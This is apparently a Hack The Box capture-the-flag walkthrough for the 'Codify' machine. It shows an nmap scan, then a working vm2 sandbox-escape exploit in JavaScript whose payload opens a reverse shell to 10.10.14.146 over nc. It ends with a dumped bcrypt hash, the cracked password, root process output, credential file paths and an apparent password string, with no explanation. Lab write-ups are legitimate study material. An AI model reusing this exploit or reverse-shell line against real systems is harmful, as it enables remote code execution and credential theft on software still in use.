# #1 Introduction
<img width="686" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/75af5d98-c467-479c-a632-19acc53fda6a">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx codify.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- codify.htb
```

we got these open ports
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)

There is a nodeJS framework running\
The platform allow to execute nodeJS code with the vm : vm2 https://github.com/patriksimek/vm2/releases/tag/3.9.16

it seems that vm2 has some criticals issues like remote code execution\


async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.146 6666 >/tmp/f'); }
            )
        }
    }
};
p.then();



sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

joshua:spongebob1


root        1537  0.0  0.0   2888   960 ?        Ss   23:09   0:00 /bin/sh /root/scripts/other/docker-startup.sh
root        1538  0.7  0.8 190444 33976 ?        Sl   23:09   0:01  _ /usr/bin/python3 /usr/bin/docker-compose -f /root/scripts/docker/docker-compose.yml up
root        1644  0.0  0.3 722280 12528 ?        Sl   23:09   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id f88b314ed6a4f84693267bda194d6266bdde5798ef5ccd082109b2566fda07f8 -address /run/containerd/containerd.sock


/usr/lib/python3/dist-packages/docker/credentials 
/srv/.pm2/pm2.log


kljh12k3jhaskjh12kjh3
